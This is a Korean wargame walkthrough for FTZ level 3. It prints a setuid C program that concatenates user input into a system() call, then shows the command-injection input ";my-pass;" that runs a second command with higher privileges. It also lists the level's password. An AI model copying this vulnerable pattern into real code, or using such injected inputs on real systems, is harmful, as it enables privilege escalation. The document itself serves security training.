---
sort: 3
---

# Level 3

```note
id : level3

password : can you fly?
```

hint를 보면 autodig의 소스코드를 뱉는다.

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
 
int main(int argc, char **argv){
 
    char cmd[100];
 
    if( argc!=2 ){
        printf( "Auto Digger Version 0.9\n" );
        printf( "Usage : %s host\n", argv[0] );
        exit(0);
    }
 
    strcpy( cmd, "dig @" );
    strcat( cmd, argv[1] );
    strcat( cmd, " version.bind chaos txt");
 
    system( cmd );
 
}
```

아래와 같이 autodig에는 setuid가 걸려있어서 실행하면 level4의 권한을 얻게된다.

```bash
[level3@ftz level3]$ ls -al `which autodig`
-rwsr-x---    1 level4   level3      12194 Sep 10  2011 /bin/autodig
```

소스코드를 보니 최종적으로 `dig @argv[1] version.bind chaos txt`가 실행되는 것을 알 수 있다.<br>
dig가 뭘 하는지는 관심없고, 우리는 그저 level4의 비밀번호를 얻는게 목적이니 `;my-pass;`를 넣어준다.<br><br>
`;my-pass;`를 큰따옴표로 감싸야 세미콜론을 문자열로써 인식하게 된다. 

```bash
[level3@ftz level3]$ autodig ";my-pass;"
```

```tip
## 알게 된 점

shell 한 줄에서 여러 명령어 실행하기
```